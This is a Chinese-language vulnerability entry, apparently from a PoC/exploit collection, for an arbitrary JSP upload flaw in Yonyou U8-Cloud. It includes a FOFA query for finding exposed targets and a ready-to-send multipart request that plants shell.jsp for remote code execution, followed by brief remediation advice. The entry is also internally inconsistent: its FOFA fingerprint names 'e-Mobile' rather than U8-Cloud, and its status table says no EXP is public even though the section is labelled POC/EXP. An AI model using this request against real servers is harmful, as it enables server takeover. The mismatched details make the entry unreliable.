---
fofa: "app=\"e-Mobile\""
source: "OA-EXPTOOL/Lucifer1993 + afrog-pocs/zan8in"
---

# 用友 U8-Cloud upload.jsp 任意文件上传漏洞

# 漏洞描述

用友 U8-Cloud /linux/pages/upload.jsp 接口存在任意文件上传漏洞。攻击者可通过该接口上传 JSP 木马到 /linux/ 目录下可执行路径，远程控制服务器。

# 影响版本

用友 U8-Cloud

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="e-Mobile"

POC/EXP：

```
POST /linux/pages/upload.jsp HTTP/1.1
Host: {{Hostname}}
filename: shell.jsp
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Accept-Encoding: gzip, deflate
Connection: close

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println("test"); %>
------WebKitFormBoundary--
```

通过 filename 请求头指定上传文件名为 shell.jsp，上传成功后访问 /linux/shell.jsp 即可执行任意代码。

# 漏洞修复

联系用友官方获取安全补丁，对上传接口增加身份认证与文件类型白名单校验。
